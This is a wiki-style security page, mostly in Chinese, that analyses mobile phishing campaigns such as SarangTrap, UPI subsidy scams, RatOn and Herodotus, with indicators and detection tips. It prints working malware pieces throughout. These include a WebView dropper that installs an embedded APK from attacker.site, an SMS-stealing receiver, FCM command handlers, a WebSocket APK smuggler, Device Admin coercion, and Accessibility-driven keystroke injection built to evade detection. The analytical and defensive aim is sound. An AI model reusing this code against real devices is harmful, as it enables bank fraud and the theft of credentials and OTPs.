# 移动网络钓鱼与恶意应用分发 (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> 本页介绍威胁行为者通过钓鱼（SEO、社会工程、假冒商店、约会应用等）分发 **恶意 Android APKs** 和 **iOS 移动配置文件** 的技术。
> 材料改编自 Zimperium zLabs（2025）披露的 SarangTrap 活动及其他公开研究。

## 攻击流程

1. **SEO/Phishing 基础设施**
* 注册数十个相似域名（约会、云分享、汽车服务等）。
– 使用本地语言关键词并在 `<title>` 元素中加入表情符号以提高 Google 排名。
– 在同一落地页上同时托管 Android (`.apk`) 和 iOS 安装说明。
2. **第一阶段下载**
* Android：直接链接到 *未签名* 或“第三方商店”APK。
* iOS：`itms-services://` 或普通 HTTPS 链接到恶意 **mobileconfig** 配置文件（见下文）。
3. **安装后社会工程**
* 首次运行时，应用会要求提供 **邀请/验证码**（制造独占访问的假象）。
* 该代码通过 **HTTP POST** 发送到 Command-and-Control (C2)。
* C2 回复 `{"success":true}` ➜ 恶意程序继续执行。
* 从不提交有效代码的沙箱/AV 动态分析将看不到 **恶意行为**（规避检测）。
4. **运行时权限滥用 (Android)**
* 危险权限仅在收到 C2 的正面响应后才请求：
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* 新的变种会**从 `AndroidManifest.xml` 中移除 SMS 的 `<uses-permission>`**，但保留通过反射读取 SMS 的 Java/Kotlin 代码路径 ⇒ 降低静态检测得分，同时在通过 `AppOps` 滥用或老旧目标设备上仍能工作。
5. **伪装 UI 与后台采集**
* 应用显示本地实现的无害界面（短信查看器、图库选择器）。
* 同时它会外传：
- IMEI / IMSI、手机号
- 完整的 `ContactsContract` 导出（JSON 数组）
- 从 `/sdcard/DCIM` 提取的 JPEG/PNG，使用 [Luban](https://github.com/Curzibn/Luban) 压缩以减小体积
- 可选的 SMS 内容（`content://sms`）
Payloads are **batch-zipped** and sent via `HTTP POST /upload.php`.
6. **iOS 交付技术**
* 单个 **移动配置文件** 可以请求 `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` 等，以将设备注册到类似 “MDM” 的监管中。
* 社会工程安装指引：
1. 打开 Settings ➜ *Profile downloaded*。
2. 点击 *Install* 三次（钓鱼页面上有截图）。
3. 信任未签名的配置文件 ➜ 攻击者在无需 App Store 审核的情况下获得 *Contacts* 与 *Photo* 授权。
7. **网络层**
* 明文 HTTP，常在 80 端口，HOST 头类似 `api.<phishingdomain>.com`。
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)`（无 TLS → 易被发现）。

## 红队提示

* **动态分析绕过** – 在恶意软件评估期间，使用 Frida/Objection 自动化邀请代码阶段以触发恶意分支。
* **Manifest 与运行时差异** – 比较 `aapt dump permissions` 与运行时的 `PackageManager#getRequestedPermissions()`；缺失的危险权限是一个风险信号。
* **网络金丝雀** – 配置 `iptables -p tcp --dport 80 -j NFQUEUE` 以检测代码输入后不正常的 POST 高峰。
* **mobileconfig 检查** – 在 macOS 上使用 `security cms -D -i profile.mobileconfig` 列出 `PayloadContent` 并发现过多的权限。

## 有用的 Frida 片段：自动绕过邀请代码

<details>
<summary>Frida：自动绕过邀请代码</summary>
```javascript
// frida -U -f com.badapp.android -l bypass.js --no-pause
// Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
</details>

## 通用指标
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 模式

此模式已在滥用政府福利主题的活动中被观测到，用于窃取印度 UPI 凭证和 OTP。运营者串联信誉良好的平台来投放并提高抗打击能力。

### 跨可信平台的投放链
- YouTube 视频诱饵 → 描述中包含短链
- 短链 → GitHub Pages phishing site，模仿合法门户
- 同一 GitHub 仓库托管一个 APK，带有假 “Google Play” 徽章并直接链接到文件
- 动态 phishing 页面托管在 Replit；远程命令通道使用 Firebase Cloud Messaging (FCM)

### Dropper：嵌入式 payload 与离线安装
- 第一个 APK 是一个 installer（dropper），在 `assets/app.apk` 中携带真实 malware，并提示用户禁用 Wi‑Fi/mobile data 以削弱云检测。
- 嵌入式 payload 以无害标签安装（例如 “Secure Update”）。安装后，installer 与 payload 将作为独立应用同时存在。

静态排查提示（grep 搜索嵌入的 payloads）：
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### 通过 shortlink 动态发现 endpoint
- Malware 从 shortlink 获取一份纯文本、用逗号分隔的活动 endpoint 列表；简单的字符串转换生成最终的 phishing 页面路径。

示例（已脱敏）：
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
伪代码:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-based UPI credential harvesting
- “Make payment of ₹1 / UPI‑Lite” 步骤在 WebView 内从动态端点加载攻击者 HTML 表单并捕获敏感字段（手机、银行、UPI PIN），这些字段通过 `POST` 提交到 `addup.php`。

最小加载器：
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### 自我传播与 SMS/OTP 拦截
- 在首次运行时会请求激进的权限：
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- 联系人被循环用于从受害者的设备群发 smishing SMS。
- 收到的 SMS 会被 broadcast receiver 截获，并连同元数据（发送者, 消息正文, SIM slot, 每设备随机 ID）上传到 `/addsm.php`。

接收器示意：
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) 作为弹性 C2
- payload 向 FCM 注册；推送消息携带一个 `_type` 字段，用作触发动作的开关（例如，更新钓鱼文本模板、切换行为）。

Example FCM payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Handler 草图:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Indicators/IOCs
- APK 包含次级 payload，位于 `assets/app.apk`
- WebView 从 `gate.htm` 加载 payment 并外发到 `/addup.php`
- 通过 SMS 外发到 `/addsm.php`
- 通过 Shortlink 获取配置（例如 `rebrand.ly/*`），响应为 CSV 格式的端点
- 应用被标记为通用 “Update/Secure Update”
- 在不受信任的应用中，FCM `data` 消息带有 `_type` 判别字段

---

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Attackers increasingly replace static APK links with a Socket.IO/WebSocket channel embedded in Google Play–looking lures. This conceals the payload URL, bypasses URL/extension filters, and preserves a realistic install UX.

在真实环境中观察到的典型客户端流程：

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

为什么它能够规避简单的防护：
- 未暴露静态 APK URL；有效载荷从 WebSocket 帧在内存中重构。
- 阻止直接 .apk 响应的 URL/MIME/扩展名过滤器可能会漏掉通过 WebSockets/Socket.IO 隧道传输的二进制数据。
- 不执行 WebSockets 的爬虫和 URL 沙箱将无法获取有效载荷。

另请参见 WebSocket 的实战技巧与工具：

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn 案例研究

RatOn banker/RAT 活动（ThreatFabric）是一个具体示例，说明现代 mobile phishing 行动如何将 WebView droppers、基于 Accessibility 的 UI 自动化、overlays/赎金界面、Device Admin 强制手段、Automated Transfer System (ATS)、crypto wallet takeover，甚至 NFC-relay 编排结合起来。本节对这些可复用技术进行抽象。

### Stage-1：WebView → 本地安装桥（dropper）
攻击者展示一个指向攻击者页面的 WebView，并注入一个暴露本地安装器的 JavaScript 接口。点击 HTML 按钮会调用本地代码，该代码安装捆绑在 dropper 资产中的二阶段 APK，然后直接启动它。

最小模式：

<details>
<summary>Stage-1 dropper 最小模式 (Java)</summary>
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
</details>

页面上的 HTML：
```html
<button onclick="bridge.installApk()">Install</button>
```
安装后，dropper 通过 explicit package/activity 启动 payload:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Hunting idea: untrusted apps calling `addJavascriptInterface()` and exposing installer-like methods to WebView; APK shipping an embedded secondary payload under `assets/` and invoking the Package Installer Session API.

### 同意流程：Accessibility + Device Admin + 后续运行时提示
Stage-2 打开一个托管 “Access” 页面 的 WebView。页面上的按钮调用一个 exported 方法，导航受害者到 Accessibility 设置并请求启用该恶意服务。一旦授予权限，malware 会利用 Accessibility 在后续运行时权限对话框（contacts、overlay、manage system settings 等）中自动点击通过，并请求 Device Admin。

- Accessibility 通过在节点树中查找类似 “Allow”/“OK” 的按钮并派发点击事件，编程式地帮助接受后续提示。
- Overlay 权限 检查/请求：
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
另见：

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### 通过 WebView 的覆盖式钓鱼/勒索
操作者可以发送命令以：
- 从 URL 渲染全屏覆盖，或
- 传递内联 HTML，并将其加载到 WebView 覆盖中。

可能用途：胁迫（PIN 输入）、打开钱包以捕获 PIN、勒索消息。应保留一个命令以在缺少覆盖权限时确保授予该权限。

### 远程控制模型 – 文本伪屏 + 屏幕投射
- 低带宽：定期转储 Accessibility 节点树，序列化可见文本/角色/边界，并作为伪屏发送到 C2（命令例如 `txt_screen` 一次性，`screen_live` 持续）。
- 高保真：请求 MediaProjection 并按需开始屏幕投射/录制（命令例如 `display` / `record`）。

### ATS 剧本（银行应用自动化）
给定一个 JSON 任务，打开银行应用，通过 Accessibility 以文本查询和坐标点击相结合的方式驱动 UI，并在提示时输入受害者的支付 PIN。

示例任务:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Example texts seen in one target flow (CZ → EN):
- "Nová platba" → "新付款"
- "Zadat platbu" → "输入付款"
- "Nový příjemce" → "新收款人"
- "Domácí číslo účtu" → "国内账户号码"
- "Další" → "下一步"
- "Odeslat" → "发送"
- "Ano, pokračovat" → "是，继续"
- "Zaplatit" → "支付"
- "Hotovo" → "完成"

Operators can also check/raise transfer limits via commands like `check_limit` and `limit` that navigate the limits UI similarly.

### Crypto wallet seed extraction
Targets like MetaMask, Trust Wallet, Blockchain.com, Phantom. Flow: unlock (stolen PIN or provided password), navigate to 安全/恢复, reveal/show seed phrase, keylog/exfiltrate it. Implement locale-aware selectors (EN/RU/CZ/SK) to stabilise navigation across languages.

### Device Admin coercion
Device Admin APIs are used to increase PIN-capture opportunities and frustrate the victim:

- 立即锁定:
```java
dpm.lockNow();
```
- 使当前凭证过期以强制更改（Accessibility 捕获新的 PIN/密码）:
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- 强制非生物识别解锁，通过禁用 keyguard 的生物识别功能：
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
注意：许多 DevicePolicyManager 控制在近期 Android 上需要 Device Owner/Profile Owner；某些 OEM 构建可能较为宽松。始终在目标 OS/OEM 上验证。

### NFC relay orchestration (NFSkate)
Stage-3 can install and launch an external NFC-relay module (e.g., NFSkate) and even hand it an HTML template to guide the victim during the relay. This enables contactless card-present cash-out alongside online ATS.

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator command set (sample)
- UI/state: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Accessibility-driven ATS anti-detection: human-like text cadence and dual text injection (Herodotus)

攻击者越来越多地将 Accessibility-driven 自动化与针对基本行为生物识别的反检测技术结合。最近一个 banker/RAT 展示了两种互补的文本传送模式以及一个操作员切换，用于模拟带随机节奏的人类输入。

- Discovery mode: 枚举可见节点，使用选择器和 bounds 精确定位输入（ID、text、contentDescription、hint、bounds）后再操作。
- Dual text injection:
- Mode 1 – `ACTION_SET_TEXT` 直接作用于目标节点（稳定，无需键盘）；
- Mode 2 – 先设置剪贴板并对聚焦节点执行 `ACTION_PASTE`（在 direct setText 被阻止时可用）。
- Human-like cadence: 将操作员提供的字符串拆分，并以字符为单位发送，每次事件间随机延迟 300–3000 ms，以规避“机器速度打字”启发式检测。可通过逐步用 `ACTION_SET_TEXT` 增长值来实现，或逐字符粘贴实现。

<details>
<summary>Java 草图：节点发现 + 通过 setText 或 clipboard+paste 逐字符延迟输入</summary>
```java
// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
void discover(AccessibilityNodeInfo r, List<String> out){
if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
r.getClassName(), id, txt, cd, b.toShortString()));
for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
}

// Mode 1: progressively set text with randomized 300–3000 ms delays
void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
String cur = "";
for (char c: s.toCharArray()){
cur += c; Bundle b=new Bundle();
b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}

// Mode 2: clipboard + paste per-char with randomized delays
void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
for (char c: s.toCharArray()){
cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}
```
</details>

用于欺诈掩护的阻断覆盖层：
- 渲染全屏 `TYPE_ACCESSIBILITY_OVERLAY`，由操作者控制不透明度；在远程自动化在下面运行时对受害者保持不透明。
- 通常暴露的命令：`opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.

可调 alpha 的最小覆盖层：
```java
View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
PixelFormat.TRANSLUCENT);
wm.addView(v, lp);
```
常见的操作控制原语： `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (屏幕共享)。

## 参考资料

- [New Android Malware Herodotus Mimics Human Behaviour to Evade Detection](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)

{{#include ../../banners/hacktricks-training.md}}
